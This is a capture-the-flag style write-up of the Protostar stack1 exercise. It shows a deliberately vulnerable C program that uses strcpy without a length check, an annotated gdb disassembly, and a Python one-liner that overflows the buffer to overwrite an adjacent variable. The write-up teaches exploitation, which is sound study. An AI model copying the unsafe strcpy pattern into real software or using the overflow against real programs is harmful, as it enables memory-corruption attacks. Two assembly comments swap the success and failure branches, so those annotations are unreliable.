# Protostar :: Stack1

Here is the code for this particular exercise.
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Just like the last one, the solution to this exercise is fairly simple. Let's
disassemble the binary in gdb to get a better sense of it. I'll write comments
in the assembly code to make what's happening a bit more clear.
```bash
$ gdb stack1
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x08048464 <main+0>:    push   ebp
0x08048465 <main+1>:    mov    ebp,esp
0x08048467 <main+3>:    and    esp,0xfffffff0
0x0804846a <main+6>:    sub    esp,0x60

# if (argc == 1)
0x0804846d <main+9>:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:   jne    0x8048487 <main+35>

# errx(1, "please specify an argument\n");
0x08048473 <main+15>:   mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:   mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:   call   0x8048388 <errx@plt>

# modified = 0
0x08048487 <main+35>:   mov    DWORD PTR [esp+0x5c],0x0

# strcpy(buffer, argv[1]);
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:   lea    eax,[esp+0x1c]
0x0804849f <main+59>:   mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>

# if (modified == 0x61626364)
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>

# modified != 0x61626364
# printf("Try again, you got 0x%08x\n", modified);
0x080484b2 <main+78>:   mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>

# modified == 0x61626364
# printf("you have correctly got the variable to the right value\n");
0x080484c0 <main+92>:   mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:   mov    eax,0x80485f3
0x080484c9 <main+101>:  mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:  mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>

0x080484d5 <main+113>:  leave  
0x080484d6 <main+114>:  ret    
End of assembler dump.
```

From the above disassembly we can see that the `modified` variable is located
at `$esp + 0x5c`, and the `buffer` variable is located at `$esp + 0x1c`, once
again the difference between these two is 64 bytes. So we need to write 64
bytes into the buffer, plus the value we want to write into the modified
variable, which is now `0x61626364`. But this being a little-endian OS, we
need to write it in reverse (`\x64\x63\x62\x61`).
```bash
./stack1 $(python -c 'print "A" * 64 + "\x64\x63\x62\x61"')
you have correctly got the variable to the right value
```
